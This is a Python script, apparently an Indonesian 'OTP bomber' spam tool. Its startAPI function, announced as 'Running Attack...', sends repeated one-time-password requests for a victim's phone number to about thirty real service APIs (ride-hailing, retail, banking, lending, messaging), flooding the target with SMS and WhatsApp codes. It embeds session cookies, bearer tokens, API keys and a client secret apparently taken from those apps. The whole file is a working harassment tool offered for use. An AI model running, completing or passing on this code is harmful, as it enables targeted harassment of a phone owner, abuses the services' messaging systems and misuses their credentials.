import sys
import subprocess

try:
    import pyfiglet
    from multiprocessing.dummy import Pool as ThreadPool
    from colorama import Fore, init
    from sys import argv
    import requests
    import time
    import random
    import os
    import urllib3
    import json
    import bs4
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'urllib3'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'urllib'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'bs4'])
finally:
    import requests
    import urllib3
    from bs4 import BeautifulSoup as bs

from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post, get

green = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
white = Fore.WHITE
cyan = Fore.LIGHTCYAN_EX
yellow = Fore.LIGHTYELLOW_EX
blue = Fore.LIGHTBLUE_EX
magenta = Fore.LIGHTMAGENTA_EX


def autoTyping(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.050)


def countdown(time_sec):
    mins, secs = divmod(time_sec, 2)
    timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{:02d}:{:02d}'.format(
        mins, secs)
    waktu = time.localtime()
    keterangan_jam = time.strftime("%H:%M:%S", waktu)
    keterangan_tanggal = time.strftime("%d", waktu)
    keterangan_bulan = time.strftime("%B", waktu)
    bulan_bulan = {
        "January": 'Januari',
        "February": "Februari",
        "March": "Maret",
        "April": "April",
        "May": "Mei",
        "June": "Juni",
        "July": "Juli",
        "August": "Agustus",
        "September": "September",
        "October": "Oktober",
        "November": "November",
        "December": "Desember"
    }  # Mengubah keterangan bulan menjadi bahasa Indonesia.
    bulan = bulan_bulan.get(keterangan_bulan)

    keterangan_tahun = time.strftime("%Y", waktu)

    keterangan_hari = time.strftime("%A", waktu)
    hari_hari = {
        "Sunday": 'Minggu',
        "Monday": "Senin",
        "Tuesday": "Selasa",
        "Wednesday": "Rabu",
        "Thursday": "Kamis",
        "Friday": "Jum'at",
        "Saturday": "Sabtu"
    }  # Mengubah keterangan hari menjadi bahasa Indonesia.
    hari = hari_hari.get(keterangan_hari)

    print(
        f"{timeformat} | {blue}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {yellow}Waktu {keterangan_jam}",
        end='\r')
    time.sleep(1)
    time_sec -= 1


def tanya(nomor):
    check_input = 0
    while check_input == 0:
        a = input(f"""{red}Apakah Anda ingin mengulangi Spam Tools? y/t 
{white}Input Anda: {green}""")
        if a == "y" or a == "Y":
            check_input = 1
            startProcess(nomor, 1)
            break
        elif a == "t" or a == "T":
            check_input = 1
            autoTyping(f"{green}Berhasil Keluar Dari Tools")
            sys.exit()
            break
        else:
            print("Masukkan Pilihan Dengan Benar")
            sys.exit


def startAPI(nomor):  # Don't Remove Code !!!!
    autoTyping("Running Attack...")
    b = nomor[1:12]  # Contoh: nomor = 89508226367
    c = "62" + b
    rto = 0
    RTO_flag = 0
    for _ in range(10):
        try:
            Ktbs = requests.get(
                f'https://core.ktbs.io/v2/user/registration/otp/{nomor}')
            Klikwa_XXX = requests.post(
                "https://api.klikwa.net/v1/number/sendotp",
                headers={
                    'user-agent':
                    'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
                    'Authorization': 'Basic QjMzOkZSMzM='
                },
                data=json.dumps({"number": "+62" + b}))
            Payfaz_XXX = requests.post(
                "https://api.payfazz.com/v2/phoneVerifications",
                data={
                    "phone": "0" + nomor
                },
                headers={
                    "Host": "api.payfazz.com",
                    "content-length": "17",
                    "accept": "*/*",
                    "origin": "https://www.payfazz.com",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "referer": "http://www.payfazz.com/register/BEN6ZF74XL",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }).text
            SecuredAPI = requests.post(
                f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={nomor}",
                headers={
                    'User-Agent':
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                    'Accept':
                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
                    'Accept-Encoding': 'none',
                    'Accept-Language': 'en-US,en;q=0.8',
                    'Connection': 'keep-alive'
                })
            Matahari = requests.post(
                "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",
                headers={
                    "Host": "www.matahari.com",
                    "content-length": "76",
                    "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "x-requested-with": "XMLHttpRequest",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://www.matahari.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.matahari.com/customer/account/create/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({
                    "otp_request": {
                        "mobile_number": nomor,
                        "mobile_country_code": "+62"
                    }
                })).text
            GlobalApi_fromKIPASGTS_OTPBOMBER_XXX = requests.post(
                'https://global-api.mpl.live/auth/init/otp',
                headers={
                    'Host': 'global-api.mpl.live',
                    'language': 'in',
                    'user-agent': 'mpl-android/1000153 (RV-153)',
                    'apptype': 'Cash',
                    'countrycode': 'ID',
                    'countrycallingcode': '0',
                    'flavorname': 'production_global_nowtm',
                    'buildtype': 'false',
                    'islogenabled': 'false',
                    'isdevelopmentenabled': 'false',
                    'versionname': '1.0.153_MPL_Production_ID_nowtm',
                    'buildtime': '20211215_11_23',
                    'deviceid': 'a4790cc74c2fefda',
                    'osversioncode': '29',
                    'osversion': '10',
                    'make': 'ROG',
                    'model': 'NEWS-VERSION',
                    'manufacturer': 'ROG',
                    'devicearch': 'armv8l',
                    'apktype': 'INDO_IA_NWTM_MISSIONS',
                    'deviceidnew': 'a4790cc74c2fefda',
                    'countrycodenew': 'ID',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json; charset=utf-8',
                    'content-length': '193',
                    'accept-encoding': 'gzip',
                },
                data='{"countryCode":62,"mobileNumber":"' + b +
                '","referrerCode":"","signUpOfferCode":"","imei":{"imei1":"","imei2":""},"gameId":1000002,"ivbb":"","userUid":"a0861be9-9c71-44ae-b9a2-6a63b8edba48"}'
            ).text
            Bocil = requests.post(
                "https://bocil.id/mobile/v1/miscallotp_request.php",
                headers={
                    'user-agent': 'okhttp/3.10.0'
                },
                data={
                    'user_id': '',
                    'language': 'in',
                    'phone': '62' + b,
                    'device_id': '590bc36d99d6dddb',
                    'retry': '0'
                }).text
            Battlefront = requests.post(
                "https://battlefront.danacepat.com/v1/auth/common/phone/send-code",
                headers={
                    'user-agent':
                    'Android/9;vivo/vivo 1902;KtaKilat/3.7.5;Device/;Android_ID/590bc36d99d6dddb;Channel/google_play;Ga_ID/bce68810-4f8a-4675-9452-e0d8565c9a50'
                },
                data={'mobile_no': b})
            Pinjamindo = requests.get(
                "https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"
                % b)
            Jumpstart = requests.post(
                "https://api.jumpstart.id/graphql",
                headers={
                    'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
                    'content-type': 'application/json'
                },
                data=json.dumps({
                    "operationName":
                    "CheckPhoneNoAndGenerateOtpIfNotExist",
                    "variables": {
                        "phoneNo": "+62" + b
                    },
                    "query":
                    "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"
                }))
            Asani = requests.post(
                "https://api.asani.co.id/api/v1/send-otp",
                headers={
                    'user-agent':
                    'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'
                },
                data=json.dumps({
                    "phone": "62" + b,
                    "email": "akuntesnuyul@gmail.com"
                }))
            Depop_from30 = requests.put(
                "https://webapi.depop.com/api/auth/v1/verify/phone",
                data=json.dumps({
                    "phone_number": nomor,
                    "country_code": "ID"
                }),
                headers={
                    "Host": "webapi.depop.com",
                    "accept": "application/json, text/plain, */*",
                    "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
                    "Content-Type": "application/json",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                })
            Sooplai_from30_XXX = requests.post(
                "https://api.sooplai.com/customer/register/otp/request",
                data=json.dumps({"phone": nomor}),
                headers={
                    "Host": "api.sooplai.com",
                    "accept": "application/json, text/plain, */*",
                    "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "Content-Type": "application/json",
                    "origin": "https://www.sooplai.com",
                    "referer": "https://www.sooplai.com/register",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                })
            Indo_from30 = requests.get(
                "https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP="
                + nomor,
                headers={
                    "Host":
                    "account-api-v1.klikindomaret.com",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "content-type":
                    "application/json",
                    "accept":
                    "*/*",
                    "origin":
                    "https://account.klikindomaret.com",
                    "referer":
                    "https://account.klikindomaret.com/SMSVerification?nohp=" + nomor +
                    "&type=register",
                    "accept-encoding":
                    "gzip, deflate, br",
                    "accept-language":
                    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }).text
            Wa2_from30 = requests.post(
                "https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==",
                data={
                    "namaDepan": "Tahalu" + str(random.randrange(11, 99999)),
                    "emailNope": nomor,
                    "password": "Indo" + str(random.randrange(111, 999)),
                    "konfirmasiPass": "Indo" + str(random.randrange(111, 999))
                },
                headers={
                    "Host":
                    "qtva.id",
                    "Connection":
                    "keep-alive",
                    "Accept":
                    "text/html, */*; q=0.01",
                    "X-Requested-With":
                    "XMLHttpRequest",
                    "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "Content-Type":
                    "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin":
                    "https://qtva.id",
                    "Referer":
                    "https://qtva.id/page/register/siswa",
                    "Accept-Encoding":
                    "gzip, deflate, br",
                    "Accept-Language":
                    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Cookie":
                    "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"
                }).text
            Icq_300xend = requests.post(
                "https://u.icq.net/api/v14/rapi/auth/sendCode",
                data=json.dumps({
                    "reqId": "64708-1593781791",
                    "params": {
                        "phone": c,
                        "language": "en-US",
                        "route": "sms",
                        "devId": "ic1rtwz1s1Hj1O0r",
                        "application": "icq"
                    }
                }),
                headers={
                    "accept":
                    "*/*",
                    "accept-language":
                    "en-US,en;q=0.9,id;q=0.8,mt;q=0.7",
                    "content-type":
                    "application/json",
                    "origin":
                    "http://web.icq.com",
                    "referer":
                    "http://web.icq.com/",
                    "sec-fetch-dest":
                    "empty",
                    "sec-fetch-mode":
                    "cors",
                    "sec-fetch-site":
                    "cross-site",
                    "User-Agent":
                    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                }).text
            Cairin_id_100xend = requests.post(
                "https://app.cairin.id/v1/app/sms/sendCaptcha",
                data={
                    "haveImageCode": "0",
                    "fileName": "6f8c3b90c845f09ff1bfe714a30aede8",
                    "phone": nomor,
                    "imageCode": "",
                    "userImei": "",
                    "type": "registry"
                },
                headers={
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36"
                }).text
            Cmsapi_mapclub_30xend = requests.post(
                "https://cmsapi.mapclub.com/api/signup-otp",
                data={
                    "phone": nomor
                },
                headers={
                    "Connection":
                    "keep-alive",
                    "User-Agent":
                    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                }).text
            Bukuwarung_wa_500xend = requests.post(
                "https://api-v2.bukuwarung.com/api/v2/auth/otp/send",
                headers={
                    "Host": "api-v2.bukuwarung.com",
                    "content-length": "198",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "x-app-version-name": "android",
                    "accept": "application/json, text/plain, */*",
                    "x-app-version-code": "3001",
                    "buku-origin": "tokoko-web",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://tokoko.id",
                    "sec-fetch-site": "cross-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://tokoko.id/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({
                    "action": "LOGIN_OTP",
                    "countryCode": "+62",
                    "deviceId": "test-1",
                    "method": "WA",
                    "phone": nomor,
                    "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
                    "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"
                })).text
            # Rupa_rupa_30xend                       =  requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
            Beryllium_mapclub_30xend = requests.post(
                "https://beryllium.mapclub.com/api/member/registration/sms/otp",
                headers={
                    "Host": "beryllium.mapclub.com",
                    "content-type": "application/json",
                    "accept-language": "en-US",
                    "accept": "application/json, text/plain, */*",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
                    "origin": "https://www.mapclub.com",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.mapclub.com/",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({"account": nomor})).text
            Danacita = json.loads(
                requests.get(
                    "https://api.danacita.co.id/users/send_otp/?mobile_phone=" + nomor,
                    headers={
                        "user-agent":
                        "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                    }).text)
            Kredito = requests.post(
                "https://app-api.kredito.id/client/v1/common/verify-code/send",
                '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}'
                % (b),
                headers={
                    "LPR-TIMESTAMP": "1603281035821",
                    "Accept-Language": "id-ID",
                    "LPR-BRAND": "Kredito",
                    "LPR-PLATFORM": "android",
                    "User-Agent":
                    "okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android",
                    "Authorization":
                    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
                    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
                    "Content-Type": "application/json; charset=UTF-8",
                    "Content-Length": "79"
                }).text
            Maucash = requests.get(
                f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={b}&channelType=0",
                headers={
                    "Host": "japi.maucash.id",
                    "accept": "application/json, text/plain, */*",
                    "x-origin": "google play",
                    "x-org-id": "1",
                    "x-product-code": "YN-MAUCASH",
                    "x-app-version": "2.4.23",
                    "x-source-id": "android",
                    "accept-encoding": "gzip",
                    "user-agent": "okhttp/3.12.1"
                }).text
            Gojek = requests.post("https://api.gojekapi.com/v5/customers",
                                  data={
                                      "email": "nsjwwiwiwisnsnn12@gmail.com",
                                      "name": "akuinginterbang12",
                                      "phone": c,
                                      "signed_up_country": "ID"
                                  },
                                  headers={
                                      "X-Session-ID":
                                      "f8b67b26-c6a4-44d2-9d86-8d93a80901c9",
                                      "X-Platform": "Android",
                                      "X-UniqueId": "8606f4e3b85968fd",
                                      "X-AppVersion": "3.52.2",
                                      "X-AppId": "com.gojek.app",
                                      "Accept": "application/json",
                                      "Authorization": "Bearer",
                                      "X-User-Type": "customer",
                                      "Accept-Language": "id-ID",
                                      "X-User-Locale": "id_ID",
                                      "Host": "api.gojekapi.com",
                                      "Connection": "Keep-Alive",
                                      "Accept-Encoding": "gzip",
                                      "User-Agent": "okhttp/3.12.1"
                                  }).text
            Harvestcake = requests.post(
                "https://harvestcakes.com/register",
                data={
                    "phone": b
                },
                headers={
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                }).text
            Oyo = requests.post(
                "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
                data=json.dumps({
                    "phone": b,
                    "country_code": "+62",
                    "country_iso_code": "ID",
                    "nod": "4",
                    "send_otp": "true",
                    "devise_role": "Consumer_Guest"
                }),
                headers={
                    "Host": "identity-gateway.oyorooms.com",
                    "consumer_host": "https://www.oyorooms.com",
                    "accept-language": "id",
                    "access_token":
                    "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
                    "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "Content-Type": "application/json",
                    "accept": "*/*",
                    "origin": "https://www.oyorooms.com",
                    "referer": "https://www.oyorooms.com/login",
                    "Accept-Encoding": "gzip,deflate,br"
                }).text
            Foa = requests.post(
                'https://foreignadmits.com/api/register-otp-generate-student',
                data={
                    'mobile': f'62{nomor[1:]}',
                    'countryCode': '+62'
                }).text
            Tokko_wa = requests.post(
                "https://api.tokko.io/graphql",
                headers={
                    "Host": "api.tokko.io",
                    "content-length": "306",
                    "accept-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "x-tokko-api-client": "merchant_web",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "x-tokko-api-client-version": "4.5.1",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://web.lummoshop.com",
                    "sec-fetch-site": "cross-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://web.lummoshop.com/",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({
                    "operationName":
                    "generateOTP",
                    "variables": {
                        "generateOtpInput": {
                            "phoneNumber": "+62" + nomor,
                            "hashCode": "",
                            "channel": "WHATSAPP",
                            "userType": "MERCHANT"
                        }
                    },
                    "query":
                    "mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"
                })).text
            Carsome_wa = requests.post(
                "https://www.carsome.id/website/login/sendSMS",
                headers={
                    "Host": "www.carsome.id",
                    "content-length": "38",
                    "x-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "accept": "application/json, text/plain, */*",
                    "country": "ID",
                    "x-amplitude-device-id": "A4p3vs1Ixu9wp3wFmCEG9K",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://www.carsome.id",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.carsome.id/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({
                    "username": nomor,
                    "optType": 1
                })).text
            Jenius = requests.post(
                "https://api.btpn.com/jenius",
                json.dumps({
                    "query":
                    "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n",
                    "variables": {
                        "phone": "+62" + nomor,
                        "language": "id"
                    },
                    "operationName": "registerPhone"
                }),
                headers={
                    "accept": "*/*",
                    "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
                    "version": "2.36.1-7565",
                    "accept-language": "id",
                    "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
                    "Content-Type": "application/json",
                    "Host": "api.btpn.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "Cookie":
                    "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
                    "User-Agent": "okhttp/3.12.1"
                }).text
            # Alodokter                              =  requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+nomor}})).text
            Pizzahut = requests.post(
                'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
                headers={
                    'Host': 'api-prod.pizzahut.co.id',
                    'content-length': '157',
                    'x-device-type': 'PC',
                    'sec-ch-ua-mobile': '?1',
                    'x-platform': 'WEBMOBILE',
                    'x-channel': '2',
                    'content-type': 'application/json;charset=UTF-8',
                    'accept': 'application/json',
                    'x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab',
                    'user-agent':
                    'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
                    'x-lang': 'en',
                    'save-data': 'on',
                    'x-device-id': 'web',
                    'origin': 'https://www.pizzahut.co.id',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.pizzahut.co.id/',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
                },
                data=json.dumps({
                    "email": "aldigg088@gmail.com",
                    "first_name": "Xenzi",
                    "last_name": "Wokwokw",
                    "password": "Aldi++\\/67",
                    "phone": "0" + nomor,
                    "birthday": "2000-01-02"
                })).text
            # Kredinesia                             =  requests.post("https://api.kredinesia.id/v1/login/verificationCode",headers={"Host":"api.kredinesia.id","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.kredinesia.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.kredinesia.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":nomor,"captcha":""})).text
            # Tokko                                  =  requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
